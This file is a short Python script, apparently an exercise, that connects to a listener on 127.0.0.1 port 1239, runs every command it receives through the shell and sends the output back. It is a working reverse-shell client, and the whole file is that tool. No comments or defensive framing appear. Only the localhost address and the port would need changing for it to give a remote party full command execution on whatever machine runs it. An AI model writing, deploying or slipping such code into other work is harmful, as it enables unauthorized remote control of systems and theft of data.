#!/usr/bin/env python3

import socket
import subprocess
client_socket=socket.socket()
client_socket.connect(("127.0.0.1",1239))
while True:
    client_message=client_socket.recv(1024).decode()
    output = subprocess.run(client_message,shell=True, capture_output=True,text=True)
    print(output)
    client_socket.send(output.stdout.encode() + output.stderr.encode())
client_socket.close()
exit(1)